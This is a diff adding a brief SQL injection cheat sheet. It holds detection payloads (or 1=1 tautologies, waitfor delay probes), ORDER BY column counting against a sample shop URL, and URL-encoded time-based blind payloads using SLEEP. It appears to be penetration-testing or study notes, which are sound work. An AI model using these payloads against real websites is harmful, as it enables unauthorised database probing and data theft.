@@ -1,0 +1,18 @@
+###Detection###
+
+In most of cases SQL Injection can be detected easily by providing invalid parameters like:
+', '' a' or 1=1--, "a"" or 1=1--", or a = a, a' waitfor delay '0:0:10'--, 1 waitfor delay '0:0:10'--, %26, ' or username like '% etc. and observe the changes in the behavior of the application.
+
+After determining if the website is vulnerable to SQL Injection, try to find the number of columns to extract information.
+
+# order by command can come in use to determine that: If order by query gives an error on order by 6 and not on order by 5, it means the database has 5 columns.
+--> www.onlineshopping.com/products.php?pid=8 order by 1 -- //  
+--> www.onlineshopping.com/products.php?usr=b' order by 3 -- // (If the parameter is a string then you need to add ' after it.)
+
+To preserve the space after -- add any character after that so that space doesn't get ignored in the HTTP request. Might also use #, /* */ for comments depending on the SQL database provider.
+
+### Blind Sql
+
+##Time-based
+test%25'+AND+(SELECT+6408+FROM+(SELECT(SLEEP(5)))qOqt)+AND+'Eouw%25'%3d'Eouw
+'%20and%20(select*from(select(sleep(10)))a)--
